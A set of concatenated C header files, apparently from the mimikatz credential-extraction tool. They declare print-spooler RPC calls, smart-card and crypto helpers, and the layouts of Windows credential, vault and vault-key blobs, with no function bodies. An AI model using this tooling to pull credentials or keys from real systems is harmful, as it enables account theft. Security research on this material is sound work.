DWORD RpcGetPrinterDriverDirectory(STRING_HANDLE pName, wchar_t *pEnvironment, DWORD Level, BYTE *pDriverDirectory, DWORD cbBuf, DWORD *pcbNeeded);
DWORD RpcClosePrinter(PRINTER_HANDLE *phPrinter);
DWORD RpcFindClosePrinterChangeNotification(PRINTER_HANDLE hPrinter);
DWORD RpcRemoteFindFirstPrinterChangeNotification(PRINTER_HANDLE hPrinter, DWORD fdwFlags, DWORD fdwOptions, wchar_t *pszLocalMachine, DWORD dwPrinterLocal, DWORD cbBuffer, BYTE *pBuffer);
DWORD RpcDeletePrinterDriverEx(STRING_HANDLE pName, wchar_t *pEnvironment, wchar_t *pDriverName, DWORD dwDeleteFlag, DWORD dwVersionNum);
DWORD RpcAddPrinterDriverEx(STRING_HANDLE pName, DRIVER_CONTAINER *pDriverContainer, DWORD dwFileCopyFlags);

extern RPC_IF_HANDLE winspool_v1_0_c_ifspec;

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE);
void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE, handle_t);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"

#define IOCTL_CCID_ESCAPE SCARD_CTL_CODE(3500)

#define ACR_MAX_LEN					255

typedef struct _KULL_M_ACR_COMM {
	//SCARDCONTEXT hContext;
	SCARDHANDLE hCard;
	BOOL withoutCard;
	LPVOID suppdata;
	BOOL descr;
} KULL_M_ACR_COMM, *PKULL_M_ACR_COMM;

BOOL kull_m_acr_init(SCARDCONTEXT hContext, LPCWSTR szReaderName, BOOL withoutCard, LPVOID suppdata, BOOL descr, PKULL_M_ACR_COMM comm);
void kull_m_acr_finish(PKULL_M_ACR_COMM comm);
BOOL kull_m_arc_sendrecv(PKULL_M_ACR_COMM comm, const BYTE *pbData, const UINT16 cbData, BYTE *pbResult, UINT16 *cbResult);
BOOL kull_m_acr_sendrecv_ins(PKULL_M_ACR_COMM comm, BYTE cla, BYTE ins, BYTE p1, BYTE p2, const BYTE *pbData, const UINT16 cbData, BYTE *pbResult, UINT16 *cbResult, BOOL noLe);
BOOL CALLBACK kull_m_arcr_SendRecvDirect(const BYTE *pbData, const UINT16 cbData, BYTE *pbResult, UINT16 *cbResult, LPVOID suppdata);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"

//#include "kull_m_string.h"

#define DIRTY_ASN1_ID_BOOLEAN			0x01
#define DIRTY_ASN1_ID_INTEGER			0x02
#define DIRTY_ASN1_ID_BIT_STRING		0x03
#define DIRTY_ASN1_ID_OCTET_STRING		0x04
#define DIRTY_ASN1_ID_NULL				0x05
#define DIRTY_ASN1_ID_OBJECT_IDENTIFIER	0x06
#define DIRTY_ASN1_ID_GENERAL_STRING	0x1b
#define DIRTY_ASN1_ID_GENERALIZED_TIME	0x18
#define DIRTY_ASN1_ID_SEQUENCE			0x30

#define DIRTY_ASN1_MASK_APPLICATION		0x60
#define DIRTY_ASN1_MASK_CONTEXT			0xa0

#define MAKE_APP_TAG(AppId)		((ber_tag_t) (DIRTY_ASN1_MASK_APPLICATION | AppId))
#define MAKE_CTX_TAG(CtxId)		((ber_tag_t) (DIRTY_ASN1_MASK_CONTEXT | CtxId))

void kull_m_asn1_BitStringFromULONG(BerElement * pBer, ULONG data);
void kull_m_asn1_GenTime(BerElement * pBer, PFILETIME localtime);
void kull_m_asn1_GenString(BerElement * pBer, PCUNICODE_STRING String);

typedef struct {
    unsigned short length;
    unsigned char *value;
} OssEncodedOID;

extern ASN1_PUBLIC BOOL ASN1API ASN1BERDotVal2Eoid(__in ASN1encoding_t pEncoderInfo, __in const ASN1char_t *dotOID, __out OssEncodedOID *encodedOID);
extern ASN1_PUBLIC BOOL ASN1API ASN1BEREoid2DotVal(__in ASN1decoding_t pDecoderInfo, __in const OssEncodedOID *encodedOID, __out ASN1char_t **dotOID);

BOOL kull_m_asn1_init();
void kull_m_asn1_term();
BOOL kull_m_asn1_DotVal2Eoid(__in const ASN1char_t *dotOID, __out OssEncodedOID *encodedOID);
void kull_m_asn1_freeEnc(void *pBuf);
BOOL kull_m_asn1_Eoid2DotVal(__in const OssEncodedOID *encodedOID, __out ASN1char_t **dotOID);
void kull_m_asn1_freeDec(void *pBuf);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_hid.h"

#define BUSYLIGHT_INPUT_REPORT_SIZE				65
#define BUSYLIGHT_OUTPUT_REPORT_SIZE			65

#define BUSYLIGHT_CAP_INPUTEVENT				0x01
#define BUSYLIGHT_CAP_LIGHT						0x02
#define BUSYLIGHT_CAP_SOUND						0x04
#define BUSYLIGHT_CAP_JINGLE_CLIPS				0x08

#define BUSYLIGHT_MEDIA_MASK					0x80
typedef enum _BUSYLIGHT_MEDIA_VOLUME {
	BUSYLIGHT_MEDIA_VOLUME_0_MUTE =				0,
	BUSYLIGHT_MEDIA_VOLUME_1_MIN =				1,
	BUSYLIGHT_MEDIA_VOLUME_2 =					2,
	BUSYLIGHT_MEDIA_VOLUME_3 =					3,
	BUSYLIGHT_MEDIA_VOLUME_4_MEDIUM =			4,
	BUSYLIGHT_MEDIA_VOLUME_5 =					5,
	BUSYLIGHT_MEDIA_VOLUME_6 =					6,
	BUSYLIGHT_MEDIA_VOLUME_7_MAX =				7,
} BUSYLIGHT_MEDIA_VOLUME, *PBUSYLIGHT_MEDIA_VOLUME;
typedef const BUSYLIGHT_MEDIA_VOLUME *PCBUSYLIGHT_MEDIA_VOLUME;

typedef enum _BUSYLIGHT_MEDIA_SOUND_JINGLE {
	BUSYLIGHT_MEDIA_SOUND_MUTE =				(0  << 3),
	BUSYLIGHT_MEDIA_SOUND_OPENOFFICE =			(1  << 3),
	BUSYLIGHT_MEDIA_SOUND_QUIET =				(2  << 3),
	BUSYLIGHT_MEDIA_SOUND_FUNKY =				(3  << 3),
	BUSYLIGHT_MEDIA_SOUND_FAIRYTALE =			(4  << 3),
	BUSYLIGHT_MEDIA_SOUND_KUANDOTRAIN =			(5  << 3),
	BUSYLIGHT_MEDIA_SOUND_TELEPHONENORDIC =		(6  << 3),
	BUSYLIGHT_MEDIA_SOUND_TELEPHONEORIGINAL =	(7  << 3),
	BUSYLIGHT_MEDIA_SOUND_TELEPHONEPICKMEUP =	(8  << 3),
	BUSYLIGHT_MEDIA_JINGLE_IM1 =				(9  << 3),
	BUSYLIGHT_MEDIA_JINGLE_IM2 =				(10 << 3),
} BUSYLIGHT_MEDIA_SOUND_JINGLE, *PBUSYLIGHT_MEDIA_SOUND_JINGLE;
typedef const BUSYLIGHT_MEDIA_SOUND_JINGLE *PCBUSYLIGHT_MEDIA_SOUND_JINGLE;
#define BUSYLIGHT_MEDIA(sound, volume) (BUSYLIGHT_MEDIA_MASK | (sound) | (volume))
#define BUSYLIGHT_MEDIA_MUTE BUSYLIGHT_MEDIA(BUSYLIGHT_MEDIA_SOUND_MUTE, BUSYLIGHT_MEDIA_VOLUME_0_MUTE)

typedef struct _BUSYLIGHT_DEVICE_ID {
	USHORT	Vid;
	USHORT	Pid;
	UCHAR	Capabilities;
	PCWSTR	Description;
} BUSYLIGHT_DEVICE_ID, *PBUSYLIGHT_DEVICE_ID;
typedef const BUSYLIGHT_DEVICE_ID *PCBUSYLIGHT_DEVICE_ID;

typedef struct _BUSYLIGHT_DPI {
	BYTE box_sensivity;
	BYTE box_timeout;
	BYTE box_triggertime;
} BUSYLIGHT_DPI, *PBUSYLIGHT_DPI;
typedef const BUSYLIGHT_DPI *PCBUSYLIGHT_DPI;

typedef struct _BUSYLIGHT_INFO {
	BYTE status;
	CHAR ProductId[4]; // 3 + NULL;
	CHAR CostumerId[9]; // 8 + NULL;
	CHAR Model[5]; // 4 + NULL;
	CHAR Serial[9]; // 8 + NULL;
	CHAR Mfg_ID[9]; // 8 + NULL;
	CHAR Mfg_Date[9]; // 8 + NULL;
	CHAR swrelease[7]; // 6 + NULL;
} BUSYLIGHT_INFO, *PBUSYLIGHT_INFO;

typedef struct _BUSYLIGHT_DEVICE {
	struct _BUSYLIGHT_DEVICE * next;
	DWORD id;
	PWCHAR DevicePath;
	HIDD_ATTRIBUTES hidAttributes;
	HIDP_CAPS hidCaps;
	PCBUSYLIGHT_DEVICE_ID deviceId;
	BUSYLIGHT_DPI dpi;
	HANDLE hBusy;
	DWORD dKeepAliveThread;
	HANDLE hKeepAliveThread;
	DWORD dWorkerThread;
	HANDLE hWorkerThread;
} BUSYLIGHT_DEVICE, *PBUSYLIGHT_DEVICE;

typedef struct _BUSYLIGHT_COLOR {
	BYTE red;
	BYTE green;
	BYTE blue;
} BUSYLIGHT_COLOR, *PBUSYLIGHT_COLOR;
typedef const BUSYLIGHT_COLOR *PCBUSYLIGHT_COLOR;

typedef struct _BUSYLIGHT_COMMAND_STEP {
	BYTE NextStep;
	BYTE RepeatInterval;
	BUSYLIGHT_COLOR color;
	BYTE OnTimeSteps;
	BYTE OffTimeSteps;
	BYTE AudioByte;
} BUSYLIGHT_COMMAND_STEP, *PBUSYLIGHT_COMMAND_STEP;
typedef const BUSYLIGHT_COMMAND_STEP *PCBUSYLIGHT_COMMAND_STEP;

const BUSYLIGHT_COLOR
	BUSYLIGHT_COLOR_OFF,
	BUSYLIGHT_COLOR_RED,
	BUSYLIGHT_COLOR_ORANGE,
	BUSYLIGHT_COLOR_YELLOW,
	BUSYLIGHT_COLOR_CHARTREUSE_GREEN,
	BUSYLIGHT_COLOR_GREEN,
	BUSYLIGHT_COLOR_SPRING_GREEN,
	BUSYLIGHT_COLOR_CYAN,
	BUSYLIGHT_COLOR_AZURE,
	BUSYLIGHT_COLOR_BLUE,
	BUSYLIGHT_COLOR_VIOLET,
	BUSYLIGHT_COLOR_MAGENTA,
	BUSYLIGHT_COLOR_ROSE,
	BUSYLIGHT_COLOR_WHITE
;

PCBUSYLIGHT_DEVICE_ID kull_m_busylight_devices_getIdFromAttributes(PHIDD_ATTRIBUTES attributes);
BOOL kull_m_busylight_devices_get(PBUSYLIGHT_DEVICE *devices, DWORD *count, DWORD mask, BOOL bAutoThread);
void kull_m_busylight_devices_free(PBUSYLIGHT_DEVICE devices, BOOL instantOff);

//BOOL kull_m_busylight_request_create(PBUSYLIGHT_COMMAND_STEP commands, DWORD count, PCBUSYLIGHT_DPI dpi, PBYTE *data, DWORD *size);
BOOL kull_m_busylight_request_create(PCBUSYLIGHT_COMMAND_STEP commands, DWORD count, PBYTE *data, DWORD *size);
BOOL kull_m_busylight_device_send_raw(PBUSYLIGHT_DEVICE device, LPCVOID request, DWORD size);
BOOL kull_m_busylight_device_read_raw(PBUSYLIGHT_DEVICE device, LPVOID *data, DWORD *size);

DWORD WINAPI kull_m_busylight_keepAliveThread(LPVOID lpThreadParameter);

BOOL kull_m_busylight_device_read_infos(PBUSYLIGHT_DEVICE device, BUSYLIGHT_INFO *info);
BOOL kull_m_busylight_request_send(PBUSYLIGHT_DEVICE device, PCBUSYLIGHT_COMMAND_STEP commands, DWORD count, BOOL all);
BOOL kull_m_busylight_request_send_keepalive(PBUSYLIGHT_DEVICE device, BOOL all);
BOOL kull_m_busylight_request_send_off(PBUSYLIGHT_DEVICE device, BOOL all);

BOOL kull_m_busylight_request_single_send(PBUSYLIGHT_DEVICE device, const BUSYLIGHT_COLOR * color, BYTE sound, BYTE volume, BOOL all);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"


LPCSTR FCIErrorToString(FCIERROR err);

typedef struct _KIWI_CABINET{
	HFCI hfci;
	CCAB ccab;
	ERF erf;
} KIWI_CABINET, *PKIWI_CABINET;

PKIWI_CABINET kull_m_cabinet_create(LPSTR cabinetName);
BOOL kull_m_cabinet_add(PKIWI_CABINET cab, LPSTR sourceFile, OPTIONAL LPSTR destFile);
BOOL kull_m_cabinet_close(PKIWI_CABINET cab);


/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_dpapi.h"
//#include "kull_m_string.h"

const wchar_t KULL_M_CRED_ENTROPY_CRED_DER[37];
const wchar_t KULL_M_CRED_ENTROPYDOM_CRED_DER[37];



#pragma pack(push, 4)
typedef struct _KULL_M_CRED_ATTRIBUTE {
	DWORD Flags;

	DWORD dwKeyword;
	LPWSTR Keyword;

	DWORD ValueSize;
	LPBYTE Value;
} KULL_M_CRED_ATTRIBUTE, *PKULL_M_CRED_ATTRIBUTE;

typedef struct _KULL_M_CRED_BLOB {
	DWORD	credFlags;
	DWORD	credSize;
	DWORD	credUnk0;
	
	DWORD Type;
	DWORD Flags;
	FILETIME LastWritten;
	DWORD	unkFlagsOrSize;
	DWORD	Persist;
	DWORD	AttributeCount;
	DWORD	unk0;
	DWORD	unk1;

	DWORD	dwTargetName;
	LPWSTR	TargetName;

	DWORD	dwTargetAlias;
	LPWSTR	TargetAlias;

	DWORD	dwComment;
	LPWSTR	Comment;

	DWORD	dwUnkData;
	LPWSTR	UnkData;

	DWORD	dwUserName;
	LPWSTR	UserName;

	DWORD	CredentialBlobSize;
	LPBYTE	CredentialBlob;

	PKULL_M_CRED_ATTRIBUTE *Attributes;

} KULL_M_CRED_BLOB, *PKULL_M_CRED_BLOB;

typedef struct _KULL_M_CRED_LEGACY_CRED_BLOB {
	DWORD	credSize;
	DWORD	Flags;
	DWORD	Type;

	FILETIME LastWritten;
	DWORD	unkFlagsOrSize;
	DWORD	Persist;
	DWORD	AttributeCount;
	DWORD	unk0;
	DWORD	unk1;

	DWORD	dwTargetName;
	LPWSTR	TargetName;

	DWORD	dwComment;
	LPWSTR	Comment;

	DWORD	dwTargetAlias;
	LPWSTR	TargetAlias;

	DWORD	dwUserName;
	LPWSTR	UserName;

	DWORD	CredentialBlobSize;
	LPBYTE	CredentialBlob;

	PKULL_M_CRED_ATTRIBUTE *Attributes;

} KULL_M_CRED_LEGACY_CRED_BLOB, *PKULL_M_CRED_LEGACY_CRED_BLOB;

typedef struct _KULL_M_CRED_LEGACY_CREDS_BLOB {
	DWORD	dwVersion;
	DWORD	structSize;

	DWORD	__count;
	PKULL_M_CRED_LEGACY_CRED_BLOB *Credentials;
} KULL_M_CRED_LEGACY_CREDS_BLOB, *PKULL_M_CRED_LEGACY_CREDS_BLOB;

typedef struct _KULL_M_CRED_VAULT_POLICY_KEY {
	GUID unk0;
	GUID unk1;
	DWORD dwKeyBlob;
	PVOID KeyBlob;
} KULL_M_CRED_VAULT_POLICY_KEY, *PKULL_M_CRED_VAULT_POLICY_KEY;

typedef struct _KULL_M_CRED_VAULT_POLICY {
	DWORD version;
	GUID vault;

	DWORD dwName;
	LPWSTR Name;

	DWORD unk0;
	DWORD unk1;
	DWORD unk2;

	DWORD dwKey;
	PKULL_M_CRED_VAULT_POLICY_KEY key;
} KULL_M_CRED_VAULT_POLICY, *PKULL_M_CRED_VAULT_POLICY;

typedef struct _KULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE_MAP {
	DWORD id;
	DWORD offset; //maybe 64
	DWORD unk;
} KULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE_MAP, *PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE_MAP;

typedef struct _KULL_M_CRED_VAULT_CREDENTIAL {
	GUID SchemaId;
	DWORD unk0; // 4
	FILETIME LastWritten;
	DWORD unk1; // ffffffff
	DWORD unk2; // flags ?

	DWORD dwFriendlyName;
	LPWSTR FriendlyName;
	
	DWORD dwAttributesMapSize;
	PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE_MAP attributesMap;

	DWORD __cbElements;
	PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE *attributes;
} KULL_M_CRED_VAULT_CREDENTIAL, *PKULL_M_CRED_VAULT_CREDENTIAL;

typedef struct _KULL_M_CRED_VAULT_CLEAR_ENTRY {
	DWORD id;
	DWORD size;
	BYTE data[ANYSIZE_ARRAY];
} KULL_M_CRED_VAULT_CLEAR_ENTRY, *PKULL_M_CRED_VAULT_CLEAR_ENTRY;

typedef struct _KULL_M_CRED_VAULT_CLEAR {
	DWORD version;
	DWORD count;
	DWORD unk;
	PKULL_M_CRED_VAULT_CLEAR_ENTRY *entries;
} KULL_M_CRED_VAULT_CLEAR, *PKULL_M_CRED_VAULT_CLEAR;
#pragma pack(pop)

typedef struct _KULL_M_CRED_APPSENSE_DN {
	char type[12];
	DWORD credBlobSize;
	DWORD unkBlobSize;
	BYTE data[ANYSIZE_ARRAY];
} KULL_M_CRED_APPSENSE_DN, *PKULL_M_CRED_APPSENSE_DN;

PKULL_M_CRED_BLOB kull_m_cred_create(PVOID data/*, DWORD size*/);
void kull_m_cred_delete(PKULL_M_CRED_BLOB cred);
void kull_m_cred_descr(DWORD level, PKULL_M_CRED_BLOB cred);

BOOL kull_m_cred_attributes_create(PVOID data, PKULL_M_CRED_ATTRIBUTE **Attributes, DWORD count);
void kull_m_cred_attributes_delete(PKULL_M_CRED_ATTRIBUTE *Attributes, DWORD count);
void kull_m_cred_attributes_descr(DWORD level, PKULL_M_CRED_ATTRIBUTE *Attributes, DWORD count);

PKULL_M_CRED_ATTRIBUTE kull_m_cred_attribute_create(PVOID data/*, DWORD size*/);
void kull_m_cred_attribute_delete(PKULL_M_CRED_ATTRIBUTE Attribute);
void kull_m_cred_attribute_descr(DWORD level, PKULL_M_CRED_ATTRIBUTE Attribute);

PKULL_M_CRED_LEGACY_CREDS_BLOB kull_m_cred_legacy_creds_create(PVOID data/*, DWORD size*/);
void kull_m_cred_legacy_creds_delete(PKULL_M_CRED_LEGACY_CREDS_BLOB creds);
void kull_m_cred_legacy_creds_descr(DWORD level, PKULL_M_CRED_LEGACY_CREDS_BLOB creds);

PKULL_M_CRED_LEGACY_CRED_BLOB kull_m_cred_legacy_cred_create(PVOID data/*, DWORD size*/);
void kull_m_cred_legacy_cred_delete(PKULL_M_CRED_LEGACY_CRED_BLOB cred);
void kull_m_cred_legacy_cred_descr(DWORD level, PKULL_M_CRED_LEGACY_CRED_BLOB cred);

PCWCHAR kull_m_cred_CredType(DWORD type);
PCWCHAR kull_m_cred_CredPersist(DWORD persist);

PKULL_M_CRED_VAULT_POLICY kull_m_cred_vault_policy_create(PVOID data/*, DWORD size*/);
void kull_m_cred_vault_policy_delete(PKULL_M_CRED_VAULT_POLICY policy);
void kull_m_cred_vault_policy_descr(DWORD level, PKULL_M_CRED_VAULT_POLICY policy);

PKULL_M_CRED_VAULT_POLICY_KEY kull_m_cred_vault_policy_key_create(PVOID data/*, DWORD size*/);
void kull_m_cred_vault_policy_key_delete(PKULL_M_CRED_VAULT_POLICY_KEY key);
void kull_m_cred_vault_policy_key_descr(DWORD level, PKULL_M_CRED_VAULT_POLICY_KEY key);

PKULL_M_CRED_VAULT_CREDENTIAL kull_m_cred_vault_credential_create(PVOID data/*, DWORD size*/);
void kull_m_cred_vault_credential_create_attribute_from_data(PBYTE ptr, PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribute);
void kull_m_cred_vault_credential_delete(PKULL_M_CRED_VAULT_CREDENTIAL credential);
void kull_m_cred_vault_credential_descr(DWORD level, PKULL_M_CRED_VAULT_CREDENTIAL credential);
void kull_m_cred_vault_credential_attribute_descr(DWORD level, PKULL_M_CRED_VAULT_CREDENTIAL_ATTRIBUTE attribute);

PKULL_M_CRED_VAULT_CLEAR kull_m_cred_vault_clear_create(PVOID data/*, DWORD size*/);
void kull_m_cred_vault_clear_delete(PKULL_M_CRED_VAULT_CLEAR clear);
void kull_m_cred_vault_clear_descr(DWORD level, PKULL_M_CRED_VAULT_CLEAR clear);

/*
24 00 00 00
	01 00 00 00
	02 00 00 00
	4b 44 42 4d KDBM 'MBDK'
	01 00 00 00
	10 00 00 00
		xx xx xx (16)

34 00 00 00
	01 00 00 00
	01 00 00 00
	4b 44 42 4d KDBM 'MBDK'
	01 00 00 00
	20 00 00 00
		xx xx xx (32)
*/

typedef struct _KULL_M_CRED_VAULT_POLICY_KEY_MBDK {
	DWORD keySize;
	DWORD version;
	DWORD type; // ?
	DWORD tag;
	DWORD unk0;
	KIWI_HARD_KEY key;
} KULL_M_CRED_VAULT_POLICY_KEY_MBDK, *PKULL_M_CRED_VAULT_POLICY_KEY_MBDK;

/*
38 02 00 00
	01 00 00 00
	02 00 00 00
	30 02 00 00
		4b 53 53 4d KSSM	'MSSK'
		02 00 01 00
		01 00 00 00
		10 00 00 00
		80 00 00 00 (128)
		
		10 00 00 00
			xx xx xx (16)
		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
		xx xx xx (16)
		yy yy yy (..)
		00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
		a0 00 00 00
		40 01 00 00
		00 00 00 00 00 00 00 00 00 00 00 00
		00 00 00 00 00 00 00 00 00 00 00 00

38 02 00 00
	01 00 00 00
	01 00 00 00
	30 02 00 00
		4b 53 53 4d KSSM	'MSSK'
		02 00 01 00
		01 00 00 00
		10 00 00 00
		00 01 00 00 (256)

		20 00 00 00 (32)
			xx xx xx (32)
		00 00 00 00
		xx xx xx (32)
		yy yy yy (..)
		e0 00 00 00
		c0 01 00 00
		00 00 00 00 00 00 00 00 00 00 00 00
		00 00 00 00 00 00 00 00 00 00 00 00
*/

BOOL kull_m_cred_vault_policy_key(PVOID data, DWORD size, BYTE aes128[AES_128_KEY_SIZE], BYTE aes256[AES_256_KEY_SIZE]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kull_m_string.h"
//#include "kull_m_crypto_system.h"
//#include "kull_m_file.h"


#if !defined(IPSEC_FLAG_CHECK)
#define IPSEC_FLAG_CHECK 0xf42a19b6
#endif

#if !defined(X509_ECC_PRIVATE_KEY)
#define X509_ECC_PRIVATE_KEY	(LPCSTR) 82
#endif

#if !defined(CNG_RSA_PRIVATE_KEY_BLOB)
#define CNG_RSA_PRIVATE_KEY_BLOB (LPCSTR) 83
#endif

#if !defined(NCRYPT_PREFER_VIRTUAL_ISOLATION_FLAG)
#define NCRYPT_PREFER_VIRTUAL_ISOLATION_FLAG	0x10000
#endif
#if !defined(NCRYPT_USE_VIRTUAL_ISOLATION_FLAG)
#define NCRYPT_USE_VIRTUAL_ISOLATION_FLAG		0x20000
#endif
#if !defined(NCRYPT_USE_PER_BOOT_KEY_FLAG)
#define NCRYPT_USE_PER_BOOT_KEY_FLAG			0x40000
#endif
#if !defined(NCRYPT_USE_VIRTUAL_ISOLATION_PROPERTY)
#define NCRYPT_USE_VIRTUAL_ISOLATION_PROPERTY	L"Virtual Iso"
#endif
#if !defined(NCRYPT_USE_PER_BOOT_KEY_PROPERTY)
#define NCRYPT_USE_PER_BOOT_KEY_PROPERTY		L"Per Boot Key"
#endif

#if !defined(BCRYPT_ECCFULLPRIVATE_BLOB)
#define BCRYPT_ECCFULLPRIVATE_BLOB				L"ECCFULLPRIVATEBLOB"
#endif

#if !defined(BCRYPT_ECDH_PRIVATE_GENERIC_MAGIC)
#define BCRYPT_ECDH_PRIVATE_GENERIC_MAGIC   0x564B4345  // ECKV
#endif

#if !defined(BCRYPT_ECDSA_PRIVATE_GENERIC_MAGIC)
#define BCRYPT_ECDSA_PRIVATE_GENERIC_MAGIC  0x56444345  // ECDV
#endif

#if !defined(BCRYPT_HMAC_SHA256_ALG_HANDLE)
#define BCRYPT_HMAC_SHA256_ALG_HANDLE	((BCRYPT_ALG_HANDLE) 0x000000b1)
#endif

#ifndef CRYPT_ECC_PRIVATE_KEY_INFO_v1
//+-------------------------------------------------------------------------
//  ECC Private Key Info
//--------------------------------------------------------------------------
typedef struct _CRYPT_ECC_PRIVATE_KEY_INFO{
    DWORD                       dwVersion;  // ecPrivKeyVer1(1)
    CRYPT_DER_BLOB              PrivateKey; // d
    LPSTR                       szCurveOid; // Optional
    CRYPT_BIT_BLOB              PublicKey;  // Optional (x, y)
}  CRYPT_ECC_PRIVATE_KEY_INFO, *PCRYPT_ECC_PRIVATE_KEY_INFO;
#define CRYPT_ECC_PRIVATE_KEY_INFO_v1       1
#endif



BOOL kull_m_crypto_hash(ALG_ID algid, LPCVOID data, DWORD dataLen, LPVOID hash, DWORD hashWanted);
BOOL kull_m_crypto_hkey(HCRYPTPROV hProv, ALG_ID calgid, LPCVOID key, DWORD keyLen, DWORD flags, HCRYPTKEY *hKey, HCRYPTPROV *hSessionProv);
BOOL kull_m_crypto_hmac(DWORD calgid, LPCVOID key, DWORD keyLen, LPCVOID message, DWORD messageLen, LPVOID hash, DWORD hashWanted);
BOOL kull_m_crypto_pkcs5_pbkdf2_hmac(DWORD calgid, LPCVOID password, DWORD passwordLen, LPCVOID salt, DWORD saltLen, DWORD iterations, BYTE *key, DWORD keyLen, BOOL isDpapiInternal);
BOOL kull_m_crypto_desx_encrypt(HCRYPTPROV hProv, LPCVOID key, LPCVOID block, PVOID encrypted);
BOOL kull_m_crypto_desx_decrypt(HCRYPTPROV hProv, LPCVOID key, LPCVOID block, PVOID decrypted);
BOOL kull_m_crypto_aesCTSEncryptDecrypt(DWORD aesCalgId, PVOID data, DWORD szData, PVOID key, DWORD szKey, PVOID pbIV, BOOL encrypt);
BOOL kull_m_crypto_DeriveKeyRaw(ALG_ID hashId, LPVOID hash, DWORD hashLen, LPVOID key, DWORD keyLen);
BOOL kull_m_crypto_close_hprov_delete_container(HCRYPTPROV hProv);
BOOL kull_m_crypto_hkey_session(ALG_ID calgid, LPCVOID key, DWORD keyLen, DWORD flags, HCRYPTKEY *hSessionKey, HCRYPTPROV *hSessionProv);
DWORD kull_m_crypto_hash_len(ALG_ID hashId);
DWORD kull_m_crypto_cipher_blocklen(ALG_ID hashId);
DWORD kull_m_crypto_cipher_keylen(ALG_ID hashId);
NTSTATUS kull_m_crypto_get_dcc(PBYTE dcc, PBYTE ntlm, PUNICODE_STRING Username, DWORD realIterations);
BOOL kull_m_crypto_genericAES128Decrypt(LPCVOID pKey, LPCVOID pIV, LPCVOID pData, DWORD dwDataLen, LPVOID *pOut, DWORD *dwOutLen);

BOOL kull_m_crypto_exportPfx(HCERTSTORE hStore, LPCWSTR filename);
BOOL kull_m_crypto_DerAndKeyToPfx(LPCVOID der, DWORD derLen, LPCVOID key, DWORD keyLen, BOOL isPvk, LPCWSTR filename);
BOOL kull_m_crypto_DerAndKeyInfoToPfx(LPCVOID der, DWORD derLen, PCRYPT_KEY_PROV_INFO pInfo, LPCWSTR filename);
BOOL kull_m_crypto_DerAndKeyInfoToStore(LPCVOID der, DWORD derLen, PCRYPT_KEY_PROV_INFO pInfo, DWORD systemStore, LPCWSTR store, BOOL force);

BOOL kull_m_crypto_CryptGetProvParam(HCRYPTPROV hProv, DWORD dwParam, BOOL withError, PBYTE *data, OPTIONAL DWORD *cbData, OPTIONAL DWORD *simpleDWORD);
BOOL kull_m_crypto_NCryptGetProperty(NCRYPT_HANDLE monProv, LPCWSTR pszProperty, BOOL withError, PBYTE *data, OPTIONAL DWORD *cbData, OPTIONAL DWORD *simpleDWORD, OPTIONAL NCRYPT_HANDLE *simpleHandle);
BOOL kull_m_crypto_NCryptFreeHandle(NCRYPT_PROV_HANDLE *hProv, NCRYPT_KEY_HANDLE *hKey);
BOOL kull_m_crypto_NCryptImportKey(LPCVOID data, DWORD dwSize, LPCWSTR type, NCRYPT_PROV_HANDLE *hProv, NCRYPT_KEY_HANDLE *hKey);

typedef struct _KULL_M_CRYPTO_DUAL_STRING_DWORD {
	PCWSTR	name;
	DWORD	id;
} KULL_M_CRYPTO_DUAL_STRING_DWORD, *PKULL_M_CRYPTO_DUAL_STRING_DWORD;

typedef struct _KULL_M_CRYPTO_DUAL_STRING_STRING {
	PCWSTR	name;
	PCWSTR	realname;
} KULL_M_CRYPTO_DUAL_STRING_STRING, *PKULL_M_CRYPTO_DUAL_STRING_STRING;

#define CERT_cert_file_element	32
#define CERT_crl_file_element	33
#define CERT_ctl_file_element	34
#define CERT_keyid_file_element	35

DWORD kull_m_crypto_system_store_to_dword(PCWSTR name);
DWORD kull_m_crypto_provider_type_to_dword(PCWSTR name);
PCWSTR kull_m_crypto_provider_type_to_name(const DWORD dwProvType);
PCWCHAR kull_m_crypto_provider_to_realname(PCWSTR name);
PCWCHAR kull_m_crypto_keytype_to_str(const DWORD keyType);
PCWCHAR kull_m_crypto_algid_to_name(ALG_ID algid);
ALG_ID kull_m_crypto_name_to_algid(PCWSTR name);
PCWCHAR kull_m_crypto_cert_prop_id_to_name(const DWORD propId);
void kull_m_crypto_kp_permissions_descr(const DWORD keyPermissions);
